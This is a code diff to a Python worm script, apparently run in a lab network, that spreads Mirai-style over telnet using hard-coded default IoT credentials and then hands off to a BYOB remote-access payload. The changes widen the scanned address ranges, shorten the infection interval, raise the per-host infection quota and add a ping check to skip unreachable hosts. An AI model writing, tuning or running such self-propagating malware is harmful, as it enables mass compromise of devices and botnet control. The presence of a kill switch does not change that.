@@ -7,6 +7,7 @@ import socket
 import sys
 import telnetlib3
 import os
+import subprocess
 
 # GLOBAL CONFIGURATION
 # Mirai C2 Server configuration
@@ -27,16 +28,15 @@ MIRAI_CREDS = [
     ("root", "vizxv"), ("root", "xc3511"), ("root", "admin"),
     ("admin", "admin"), ("root", "888888")
 ]
-# Network ranges to scan for vulnerable hosts
-NET_PREFIXES = ["10.150.0.", "10.151.0.", "10.152.0.", "10.153.0.", "10.154.0.", "10.160.0.",
-                "10.161.0.", "10.162.0.", "10.163.0.", "10.164.0.", "10.170.0.", "10.171.0."]
-HOST_IDS = range(71, 79)
+
+NET_PREFIXES = [f"10.{x}.0." for x in range(150, 180)] 
+HOST_IDS = range(50, 150) 
 
 # Worm behavior parameters
-ROUND_INTERVAL = 10  # Seconds between infection rounds
-TARGETS_PER_ROUND = 1
+ROUND_INTERVAL = 5  # Seconds between infection rounds
+TARGETS_PER_ROUND = 2
 MAX_CONCURRENCY = 10
-MAX_INFECT_PER_HOST_MIRAI = 2  # Max number of new hosts to infect before stopping
+MAX_INFECT_PER_HOST_MIRAI = 4  # Max number of new hosts to infect before stopping
 PROMPTS = (b"$", b"#", b">")
 
 # Conditions to activate the secondary (BYOB) payload
@@ -71,12 +71,13 @@ def get_self_ip() -> str:
     # Gets the IP address of the current host.
     return socket.gethostbyname(socket.gethostname())
 
-def random_targets(n, infected_hosts):
-    # Selects n random targets, excluding self and already infected hosts.
+def random_targets(n, infected_hosts, unreachable_hosts):
     self_ip = get_self_ip()
     pool = [
         f"{p}{i}" for p in NET_PREFIXES for i in HOST_IDS
-        if f"{p}{i}" not in infected_hosts and f"{p}{i}" != self_ip
+        if f"{p}{i}" not in infected_hosts
+        and f"{p}{i}" not in unreachable_hosts
+        and f"{p}{i}" != self_ip
     ]
     n = min(n, len(pool))
     return random.sample(pool, n) if n else []
@@ -103,6 +104,29 @@ async def check_kill_switch():
         return True
     else:
         return False
+    
+async def ping_target(ip: str, count: int = 1, timeout: int = 1) -> bool:
+    """Ping a target once. Return True if reachable, False otherwise."""
+    try:
+        process = await asyncio.create_subprocess_exec(
+            "ping", "-c", str(count), "-W", str(timeout), ip,
+            stdout=asyncio.subprocess.DEVNULL,
+            stderr=asyncio.subprocess.DEVNULL
+        )
+        await process.communicate()
+        return process.returncode == 0
+    except Exception as e:
+        logging.debug(c(f"Ping to {ip} failed: {e}", "Y"))
+        return False
+    
+def pool_is_empty(infected_set):
+    self_ip = get_self_ip()
+    for p in NET_PREFIXES:
+        for i in HOST_IDS:
+            ip = f"{p}{i}"
+            if ip != self_ip and ip not in infected_set:
+                return False
+    return True
 
 # BYOB PAYLOAD ACTIVATION
 async def activate_byob_payload_on_host():
@@ -201,9 +225,13 @@ async def infect_mirai_on_target(ip):
 async def main():
     sem = asyncio.Semaphore(MAX_CONCURRENCY)
     mirai_infected_targets = set()
+    unreachable_hosts = set()   
     total_mirai_successes = 0
     consecutive_mirai_failures = 0
     mirai_propagation_active = True
+
+    logging.info("starting ping 1.2.3.4 . please check the map")
+    subprocess.Popen(["ping -q 1.2.3.4"], shell=True)
 
     if os.path.exists(BYOB_ACTIVATED_FLAG_FILE):
         logging.info(c(f"BYOB has already been activated on this host. Mirai instance will exit.", "Y"))
@@ -215,7 +243,7 @@ async def main():
         if await check_kill_switch():
             break
 
-        # Check conditions for activating the secondary BYOB payload
+        # check if it need to activate BYOB
         if total_mirai_successes >= MAX_SUCCESSFUL_MIRAI_INFECTIONS_FOR_BYOB or \
            consecutive_mirai_failures >= MAX_CONSECUTIVE_MIRAI_FAILURES_FOR_BYOB:
             logging.info(c(f"Condition to activate BYOB met: "
@@ -225,7 +253,7 @@ async def main():
             await activate_byob_payload_on_host()
             break
 
-        # Check if this instance has reached its infection quota
+        # check if the host reached the maximum infection arg
         if len(mirai_infected_targets) >= MAX_INFECT_PER_HOST_MIRAI:
             logging.info(c(f"This instance has reached its infection quota "
                            f"({len(mirai_infected_targets)}/{MAX_INFECT_PER_HOST_MIRAI}). "
@@ -234,35 +262,54 @@ async def main():
             await activate_byob_payload_on_host()
             break
 
-        remaining_quota = MAX_INFECT_PER_HOST_MIRAI - len(mirai_infected_targets)
-        targets_for_this_round = random_targets(min(TARGETS_PER_ROUND, remaining_quota), mirai_infected_targets)
-
-        if not targets_for_this_round:
+        # check if the pool is empty
+        if not random_targets(1, mirai_infected_targets, unreachable_hosts):
             logging.info(c("No new Mirai targets available, waiting for next round...", "Y"))
             consecutive_mirai_failures += 1
             await asyncio.sleep(ROUND_INTERVAL)
             continue
 
+        remaining_quota = MAX_INFECT_PER_HOST_MIRAI - len(mirai_infected_targets)
+        tasks_to_start = min(TARGETS_PER_ROUND, remaining_quota)
+
         round_num += 1
-        logging.info(c(f"\n=== Mirai Round {round_num} | Targets: {targets_for_this_round} ===", "C"))
+        logging.info(c(f"\n=== Mirai Round {round_num} | Tasks: {tasks_to_start} ===", "C"))
+        logging.info(c(f"Pool remaining: ~{len(NET_PREFIXES)*len(HOST_IDS) - len(mirai_infected_targets) - len(unreachable_hosts)}", "C"))
 
         tasks_done_this_round = 0
 
-        async def sem_infect_task(target_ip):
+        # Worker: choose targets and generate work
+        async def sem_infect_task():
             nonlocal tasks_done_this_round, total_mirai_successes, consecutive_mirai_failures
             async with sem:
-                success = await infect_mirai_on_target(target_ip)
-                if success:
-                    mirai_infected_targets.add(target_ip)
-                    total_mirai_successes += 1
-                    consecutive_mirai_failures = 0
-                else:
-                    consecutive_mirai_failures += 1
-                tasks_done_this_round += 1
-                print(progress_bar(tasks_done_this_round, len(targets_for_this_round)), end="\r")
+                while True:
+                    candidates = random_targets(1, mirai_infected_targets, unreachable_hosts)
+                    if not candidates:
+                        logging.info(c("No more available targets in pool (checked inside worker).", "Y"))
+                        consecutive_mirai_failures += 1
+                        break
 
-        await asyncio.gather(*(sem_infect_task(t) for t in targets_for_this_round))
-        print() 
+                    target_ip = candidates[0]
+                    reachable = await ping_target(target_ip)
+                    if not reachable:
+                        logging.info(c(f"Ping failed: {target_ip} unreachable, removing from pool.", "Y"))
+                        unreachable_hosts.add(target_ip)   
+                        continue
+                    else:
+                        success = await infect_mirai_on_target(target_ip)
+                        if success:
+                            mirai_infected_targets.add(target_ip)
+                            total_mirai_successes += 1
+                            consecutive_mirai_failures = 0
+                        else:
+                            consecutive_mirai_failures += 1
+                        break
+
+                tasks_done_this_round += 1
+                print(progress_bar(tasks_done_this_round, tasks_to_start), end="\r")
+
+        await asyncio.gather(*(sem_infect_task() for _ in range(tasks_to_start)))
+        print()
         logging.info(f"Mirai Round {round_num} finished. Total successes by this instance: {total_mirai_successes}, "
                      f"Consecutive failures: {consecutive_mirai_failures}")
         await asyncio.sleep(ROUND_INTERVAL)
@@ -273,6 +320,7 @@ async def main():
         await activate_byob_payload_on_host()
 
     logging.info(c("Mirai worm script main task finished. The BYOB payload (if successful) should now be in control.", "C"))
+
 
 if __name__ == "__main__":
     asyncio.run(main())
